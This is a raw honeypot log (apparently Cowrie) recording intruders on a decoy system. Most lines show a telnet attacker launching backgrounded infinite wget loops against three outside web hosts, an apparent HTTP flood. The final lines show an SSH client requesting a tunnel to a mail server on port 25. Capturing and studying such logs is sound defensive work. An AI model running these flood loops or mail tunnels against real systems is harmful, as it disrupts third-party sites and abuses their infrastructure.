2017-04-11T11:51:43+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: enable 
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T11:51:59+0000 [SSHChannel None (28) on SSHService 'ssh-connection' on HoneyPotSSHTransport,104313,91.195.103.199] remote eof
2017-04-11T11:51:59+0000 [SSHChannel None (28) on SSHService 'ssh-connection' on HoneyPotSSHTransport,104313,91.195.103.199] remote close
2017-04-11T11:51:59+0000 [SSHChannel None (28) on SSHService 'ssh-connection' on HoneyPotSSHTransport,104313,91.195.103.199] sending close 28
2017-04-11T11:51:59+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,104313,91.195.103.199] got channel 'direct-tcpip' request
2017-04-11T11:51:59+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,104313,91.195.103.199] direct-tcp connection request to 74.125.143.27:25 from localhost:5556
